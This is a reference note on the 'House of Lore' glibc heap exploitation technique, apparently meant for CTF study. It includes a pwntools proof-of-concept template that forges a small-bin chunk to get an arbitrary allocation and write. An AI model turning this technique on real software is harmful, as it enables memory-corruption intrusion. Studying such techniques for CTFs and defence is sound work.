# House of Lore

**When**: Can corrupt a small bin chunk's `bk` pointer. glibc all versions (with safe-unlink constraints in modern).
**Primitive needed**: UAF or overflow to modify a freed small bin chunk's `bk`.
**Result**: `malloc` returns a chunk at an attacker-chosen address.

## Mechanism
Small bin allocation follows `bk` pointers. Corrupt a freed chunk's `bk` to point to a fake chunk. When `malloc` allocates from the small bin, it follows `bk` → returns the legitimate chunk, and links the fake chunk into the bin. Next allocation of the same size returns the fake chunk.

## PoC
```python
# IN: UAF/overflow on a freed small bin chunk
# OUT: malloc returns fake_chunk_addr (arbitrary allocation)
from pwn import *

context.binary = elf = ELF('./binary')
p = process('./binary')

# Step 1: Get a chunk into small bin
# Fill tcache first (7 frees), then free one more → unsorted bin
# Then trigger sorting (alloc a different size) → moves to small bin
for i in range(7):
    alloc(i, 0x90); free(i)
alloc(7, 0x90)
alloc(8, 0x10)   # barrier
free(7)           # → unsorted bin
alloc(9, 0x100)   # different size → triggers sort → chunk 7 moves to small bin

# Step 2: Forge fake chunk at target location
# fake chunk needs: fd = small_bin_addr (in main_arena), bk = small_bin_addr
# These satisfy the safe-unlink check: victim->bk->fd == victim
fake = flat(
    0, 0xa1,                    # prev_size, size
    p64(small_bin_fd),          # fd → must point back such that fd->bk == fake
    p64(small_bin_bk),          # bk → must point back such that bk->fd == fake
)
write_to(target_addr, fake)

# Step 3: Corrupt chunk 7's bk to point to fake chunk
edit(7, p64(0) + p64(target_addr + 0x10))  # fd stays, bk → fake chunk

# Step 4: Allocate twice from small bin
alloc(10, 0x90)    # returns chunk 7 (legitimate)
alloc(11, 0x90)    # returns fake chunk at target_addr → arbitrary write!
edit(11, payload)
```

## Trap
- Safe-unlink (modern glibc): `victim->bk->fd == victim` must hold. The fake chunk's `fd` must point to somewhere that, when dereferenced at the `bk` offset, equals the fake chunk's address. This usually requires a heap or libc leak.
- Small bin chunks must first pass through unsorted bin → triggering the sort requires a differently-sized allocation.
